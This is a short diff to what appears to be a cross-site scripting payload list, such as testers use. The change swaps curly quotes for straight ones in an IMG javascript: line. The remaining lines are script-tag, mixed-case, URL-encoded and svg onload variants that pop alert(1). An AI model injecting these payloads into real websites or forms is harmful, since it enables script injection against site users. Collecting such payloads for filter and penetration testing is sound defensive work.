@@ -1,6 +1,6 @@
 <script>alert(1)</script>
 <ScRipT>alert(1);</ScRipT>
-<IMG SRC=”javascript:alert(1);”>
+<IMG SRC="javascript:alert(1);">
 <ScRipT>alert`1`</ScRipT>
 %3cscript%3ealert(1)%3c%2fscript%3e
 <svg onload=alert(1)+
